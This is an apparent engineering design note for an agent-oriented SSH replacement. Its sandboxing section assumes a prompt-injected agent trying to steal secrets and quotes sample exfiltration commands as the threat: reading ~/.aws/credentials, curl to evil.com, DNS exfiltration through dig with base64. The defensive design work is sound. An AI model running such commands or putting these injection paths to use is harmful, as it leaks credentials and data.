# aster-exec — Agent-Shaped Remote Execution (The SSH Replacement, Properly)

**Status:** Working idea
**Date:** 2026-06-10
**Related:**
- `aster/examples/shell.rs` — the interactive PTY surface (the *human* mode; already working)
- [../trust-directory.md](../trust-directory.md) — authorization (roles, designations, revocation, audit)
- [aster-tunneld-linux.md](aster-tunneld-linux.md) — the network plane for service traffic; exec is the control-plane sibling
- [aster-orchestrator.md](aster-orchestrator.md) — this is the orchestrator's exec/attach surface arriving early

---

## The observation

SSH is agent-hostile **structurally**: it is a terminal protocol pretending to
be an exec API. The three failure modes AI agents hit constantly are all
symptoms of forcing structured intent through a byte stream plus shell
parsing:

1. **Quoting hell** — a single command string is re-parsed by up to four
   layers (agent tool call → local shell → ssh → remote shell). Every layer
   is a chance to mangle quotes, and agents demonstrably do.
2. **Hangs** — SSH has no protocol-level notion of "the command is waiting
   for input" vs "the command is running." A `sudo` prompt, a pager, or a
   git credential prompt is silence, and the agent waits forever.
3. **Credentials** — key distribution (`authorized_keys` per host) is
   out-of-band state nobody maintains, and password fallback is unusable by
   agents.

`shell.rs` already demonstrates the human surface — a real PTY over one
bidi QUIC stream, resize frames, immediate-flush keystrokes, mesh identity
instead of host keys. **Keep it.** The fix for agents is not a better PTY; it
is a sibling **Exec contract** on the same node.

## The Exec contract

```
service Exec {
  // argv crosses the wire as a LIST. No shell parses anything, ever,
  // unless the caller explicitly asks for `shell: true`.
  unary exec(ExecRequest {
    argv:      [str],          // required; argv[0] resolved against PATH or absolute
    cwd:       str,
    env:       [{k, v}],       // merged over a pinned non-interactive base env
    stdin:     bytes,          // closed after write; empty = closed immediately
    deadline_ms: u64,          // required; server kills on expiry
    max_output_bytes: u64,     // cap; output past it is truncated WITH a marker
    profile:   str,            // exec profile name; resolved against the caller's
                               // role — callers may only name profiles their role
                               // grants (see Sandboxing). Empty = role's default.
    pty:       bool,           // default false
    shell:     bool,           // default false; true = ["$SHELL","-c",argv[0]]
    detach:    bool,           // default false; true = return job id immediately
  }) -> ExecResult {
    job_id, exit_code, timed_out, stdout, stderr, truncated,
    waiting_on_stdin,          // structured, not silence — see below
    duration_ms
  };

  server_stream attach(JobRef)   -> stream JobEvent;  // reattach by id; replays buffer
  unary         status(JobRef)   -> JobStatus;
  unary         signal(JobRef, sig) -> Ack;           // INT/TERM/KILL
  unary         list()           -> [JobStatus];

  // File transfer rides the CAS, not the stream: idempotent by content hash.
  unary put_file(PutFile { path, blob_hash, mode })   -> Ack;   // node fetches blob
  unary fetch_file(FetchFile { path })                -> { blob_hash, size };
}
```

How each SSH failure mode dies:

| Pain | Mechanism |
| --- | --- |
| Quoting | `argv` is a typed list end-to-end (Fory frames). The failure class is deleted, not mitigated. |
| Hangs | Mandatory `deadline_ms` (typed timeout result, server-side kill); **no PTY by default** so tools self-select non-interactive; pinned base env (`GIT_TERMINAL_PROMPT=0`, `DEBIAN_FRONTEND=noninteractive`, `PAGER=cat`, `CI=1`); stdin default-closed, and a child blocking on stdin anyway surfaces as a structured `waiting_on_stdin` event instead of silence. |
| Lost connections | **Jobs survive the connection, not vice versa.** `detach` returns a job id; output buffers server-side (bounded ring); any client reattaches by id after any disconnect. QUIC migration helps; the job abstraction is the real fix. PTY sessions get the same: session ids + server-side scrollback (Mosh/tmux semantics natively). |
| Credentials | The trust directory: enroll a device once (invite link); thereafter authorization is **role records** — "agent X may exec argv-mode under `/home/dev/repo` as user `dev`, no PTY, no shell, no sudo." Gate-3 reads the row; revocation is a tombstone; the audit log writes itself. No `authorized_keys`, ever. |
| File transfer | `put_file`/`fetch_file` by content hash via the blob store — resumable, idempotent retries, dedup, and big artifacts ride the multi-provider downloader. Deletes the scp-over-shell misery wholesale. |

## Sandboxing: design for a compromised agent

Frame this as a security problem, not a containment convenience. **Assume the
agent is already compromised** — prompt injection is not reliably preventable
at the model layer, so the design assumption is a fully injected agent,
operating with all the authority its role legitimately grants, actively trying
to steal a secret and exfiltrate it. The system is robust if that agent fails
anyway.

This also fixes what the sandbox defends: **the node** — its ambient secrets,
other workspaces, its identity keys, its network position. It does **not**
defend the agent's own context; that is a separate boundary, called out in
*The honest residual* below. The summary to keep in mind:

> The sandbox's job is not to stop the agent being tricked. It is to ensure a
> tricked agent holds no secret it can exfiltrate and has no channel to
> exfiltrate through — and that the one place those could meet is a quadrant
> policy cannot express.

### First, what does not work: command allowlists

The tempting fix — allowlist `argv[0]` — is theater the moment the list
contains an interpreter, and every useful dev tool is one (`bash -c`,
`python -c`, `find -exec`, `git` hooks and `-c core.fsmonitor=…`, `make`,
`npm run`). Restricted shells and `ForceCommand` wrappers have failed this way
for decades. You cannot enumerate safe *intent*. So scope **reach**, not
commands — and reason about reach adversarially, as exfiltration paths.

### The organizing principle: the lethal trifecta

Exfiltration requires three things at once: (1) access to secret data, (2)
exposure to untrusted content, (3) a channel to communicate outward. A coding
agent *always* has (2) — repo, dependencies, and the web are all untrusted
input. So the whole game is denying the **co-occurrence of (1) and (3)** in one
job. Every defense below serves that.

### Defense 1 — no ambient authority

The highest-value move, and mostly mechanism we already have. `ProtectHome=tmpfs`
blanks `$HOME`, so `~/.aws/credentials`, `~/.ssh/id_ed25519`, `~/.netrc`,
`~/.config/gh`, and git credential helpers — the entire dotfile credential
surface — **do not exist** in the job's view. Pair it with a scrubbed
environment (explicit allowlist, never inherited `environ`, so no leaked
`AWS_*` / `GITHUB_TOKEN`) and `InaccessiblePaths=` over known secret stores.
The injected `cat ~/.aws/credentials` returns ENOENT. Most real "agent
exfiltrated a secret" incidents die here, because the secret was ambient.

### Defense 2 — secrets are brokered actions, never readable values

When a job genuinely needs privilege (push to a remote, deploy, pull a private
dep), do **not** inject the secret as a file or env var: **a readable secret is
a stolen secret.** The agent reads it and it is now in the orchestrator's
transcript, exfiltrable through the agent's *own* channels regardless of the
job's network. Instead the job calls a **secret-broker** — a privileged
service outside the sandbox that holds the key, checks the job's role, performs
the action, and returns only the result. `broker.upload(artifact, "releases")`,
not "here is the S3 key." The secret never enters the job's address space, so
there is nothing to read and nothing to leak.

This is the trust-directory "perform the action, don't hand out the credential"
move ([../trust-directory.md](../trust-directory.md)) — and for the largest
case it is *free*: in the portal git mesh there are no git tokens at all; push
authority is mesh identity gated by a directory role. A whole class of "the
agent needs a credential" does not exist on this substrate.

### Defense 3 — the trifecta invariant, checked at profile-authoring time

Make the trifecta a **validated property of the profile record**, rejected when
the profile is written to the directory — not hoped for at runtime:

> No profile may grant **(readable secret) ∧ (egress)**, where *egress* = any
> of: network access, **or** write to a path that syncs / snapshots / is
> shared.

The third clause is the one people miss: writing a secret into a synced Tree
exfiltrates it with **zero network** — sync is an egress channel. So a profile
that may hold a readable secret gets `PrivateNetwork=yes` *and* a private,
non-syncing tmpfs workspace. The dangerous quadrant is unrepresentable in
policy, by construction:

```text
profile workspace:      rw <root>; ro /usr,/lib,…; deny rest; NET none;
                        no readable secret;  user <mapped>; mem/pids/cpu/time caps
profile workspace-net:  workspace + egress to BROKERED MESH SERVICES only;
                        still no readable secret
profile readonly:       ro <root>; net none      (inspection / CI checks)
profile sealed-secret:  readable secret PERMITTED; PrivateNetwork=yes;
                        private tmpfs workspace; NO sync/share/write-out at all
profile admin:          unsandboxed; PTY; HUMAN roles only; out-of-band approval
```

`workspace`, `workspace-net`, and `readonly` are trifecta-safe by construction;
`sealed-secret` is the locked island for the rare job that must hold a value;
`admin` is the explicit escape hatch. Gate-3 resolves caller → role → profile →
unit properties; enforcement is the kernel, policy is live revocable rows.

### Defense 4 — egress is the mesh, never the open internet

`PrivateNetwork=yes` with the only route being tunnels brokered through tunneld
([aster-tunneld-linux.md](aster-tunneld-linux.md)) means the job's reachable
network is exactly the named services the broker authorizes — and `evil.com` is
not a mesh service, so `curl https://evil.com` gets no route. **DNS
exfiltration dies too**: tunneld's resolver answers only configured suffixes and
the job has no other resolver, so `dig $(base64 secret).evil.com` resolves
nothing. Every flow that does happen is a brokered `open()`, identity-checked
and audited per connection. Exfiltration is not firewalled — it is
architecturally absent, because the substrate has no notion of arbitrary
outbound.

### Defense 5 — privilege separation: the reader is not the actor

The deepest structural defense against injection is that the context exposed to
untrusted content must not be the context holding power. Split the capability:
a **reader** role (fetch/read untrusted material — repos, web, deps; no
secrets, no egress, no writes to shared paths) and an **actor** role (brokered
privileged actions, fed only structured, trusted parameters). This is the
dual-LLM / CaMeL quarantine pattern as two directory roles with disjoint
capability sets. An agent that ingested a poisoned README is operating as the
reader, and the reader cannot reach the broker. Crossing from read to act is an
explicit, audited, policy-gated transition — human-confirmed for high-risk
actions.

### Defense 6 — the node agent is not a confused deputy

The node agent holds privilege and acts for the job, so it must enforce profile
bounds *itself* and treat every job-supplied argument as hostile: canonicalize
paths and reject `../` / symlink escapes out of `ReadWritePaths` (the mount
namespace enforces this; Landlock backstops it), `NoNewPrivileges=yes` +
`RestrictSUIDSGID` so a setuid binary in the repo cannot escalate, and the
node's identity key and the directory namespace secret live under a different
user behind `InaccessiblePaths` so no job can read the keys that would let it
forge authority. By the directory model the job's identity is **not** an
authoring identity — it structurally cannot write admission/role records.
Self-escalation is off the table.

### Defense 7 — tamper-evident audit + out-of-band approval

Every brokered action and every role→profile resolution is an append-only
signed record in the trust directory — the audit log writes itself, and because
records are content-addressed and cross-synced, a compromised node cannot
quietly rewrite its own history. For the genuinely dangerous tier (use a
production secret, push to `main`, reach a new external service) require
**out-of-band human approval through the console** — the human is the second
factor on a channel the injected agent does not control. Cheap, because
console-as-peer already exists.

### Enforcement substrate (mechanism, not policy)

- **Linux v1: systemd transient units.** One `systemd-run` invocation carries
  the whole surface — `ProtectSystem=strict`, `ReadWritePaths=`,
  `ReadOnlyPaths=`, `InaccessiblePaths=`, `ProtectHome=tmpfs`, `PrivateTmp=`,
  `PrivateNetwork=`, `NoNewPrivileges=`, `RestrictSUIDSGID=`, `User=`,
  `MemoryMax=`, `TasksMax=`, `CPUQuota=`, `RuntimeMaxSec=`. The exec service
  writes **no sandbox code**; it translates a profile record into unit
  properties.
- **Landlock** unprivileged fallback (kernel 5.13+, mature Rust crate) where
  systemd is absent.
- **macOS / Windows** are weaker and stated honestly: Seatbelt profiles;
  restricted token + Job Objects. Path scoping is coarser; the
  deadline/limits/no-ambient-creds story still holds.

### The honest residual — what this does NOT solve

Stated plainly, because pretending otherwise is the actual security failure:

- **The transcript channel.** If a job is *legitimately* allowed to read data
  that happens to be sensitive (a secret a human mistakenly committed to the
  repo), that data flows back over the exec result stream into the agent's
  context, and the agent can exfiltrate it through *its own* tools — a later
  web fetch, its reply to the user. exec cannot prevent misuse of data the job
  was authorized to compute. Defending the agent's context is the
  orchestrator's boundary (dual-LLM, output filtering; Defense 5 is the best
  lever exec offers). **exec defends the node, not the agent's mind.**
- **Sandbox escape.** systemd units + Landlock bound the blast radius of a
  confused agent; they are not a hostile-*code* boundary (userns/kernel escapes
  exist). Running genuinely untrusted code needs a microVM backend
  (Firecracker / gVisor) behind the *same profile schema* — a later tier,
  named, not pretended.
- **Covert / timing channels** between a job and a colluding authorized service
  are out of scope for this tier; declared, not defended.

## The delivery vehicle: MCP

Agents should receive this as **tools, not a terminal**: an MCP server
wrapping the contract — `remote_exec(node, argv, cwd, deadline)`,
`job_status`, `job_attach`, `signal`, `put_file`, `fetch_file`. Immediate
dogfood: our own fleet (n1–n5) is operated by agents over SSH today,
including the exact quoting/hang/credential failures this deletes.

## Design stances

- **Two contracts, one node**: `Shell` (PTY, humans) and `Exec` (typed,
  automation) side by side. Don't unify them; their consumers want opposite
  things.
- **Don't over-engineer stdin detection.** V1 = stdin closed by default +
  idle-output timeout event + `waiting_on_stdin` where cheaply detectable.
  No fd-introspection heroics.
- **Sandboxing via the OS, not custom code**: profiles translate to systemd
  transient-unit properties (Landlock fallback) — resource limits and
  containment are the same mechanism (see Sandboxing). Never command
  allowlists.
- **Assume the agent is compromised**: the sandbox is designed against a
  prompt-injected agent actively exfiltrating, not just a buggy one. The
  trifecta invariant — no profile grants (readable secret) ∧ (egress, incl.
  sync) — is the load-bearing rule, validated at profile-authoring time.
- **Secrets are brokered actions, never readable values**: a job calls a
  privileged broker that performs the action; the secret never enters the
  job. A readable secret is a stolen secret (it lands in the agent's
  transcript).
- **Roles are scoped narrow by default**: exec roles name a profile, a root
  path, allowed users, pty/shell capability, and signal rights — directory
  rows, evaluated live. Default profile is `workspace` (no network, no
  readable secret).

## Calibrating "a little work"

Already exists: transport, identity, NAT traversal, bidi streaming, the PTY
surface, the directory authz model, the CAS. New work is **one crate + one
adapter**: the Exec contract, a job supervisor with bounded buffers
(the `SyncSupervisor` pattern — a job is a run-once workload), deadline +
signal plumbing, role gating, the profile→unit-properties translator, and
the MCP server. Honest hard 20%: output buffer bounds and replay semantics,
stdin-wait detection portability, getting the `workspace` profile's
read-only system path set right across distros, and Windows (easier than
the shell — exec mode needs no PTY — but weakest on path scoping).

## Relationship to the orchestrator

This is [aster-orchestrator.md](aster-orchestrator.md)'s node agent arriving
early — `kubectl exec` before there is a kubectl. Same node daemon
eventually: the job supervisor generalizes to the workload supervisor; the
status/attach surfaces are the same; the directory roles are the same. It is
independently useful and demo-sized *now*, which makes it the rare piece
that serves current needs (agents operating the portal fleet) while
pre-building the third leg.

## Prior art to position against

- **Tailscale SSH** — the commercial proof that identity-from-the-mesh beats
  key management (ACLs not keys). Still a terminal protocol; no typed exec,
  no jobs, no CAS transfer. The differentiators are exactly the agent-shaped
  parts.
- **Mosh** — roaming/persistence for humans; still a terminal.
- **Teleport** — certs + audit for enterprises; heavy, server-centric.
- **k8s `exec` API** — typed-ish exec, but requires the whole k8s control
  plane and flat networking.

The defensible claim: *typed, deadline-bounded, job-persistent remote
execution with mesh identity, directory authorization, content-addressed file
transfer, and a sandbox designed against a compromised agent (the lethal
trifecta broken at policy-authoring time) — consumable by agents as tools.*
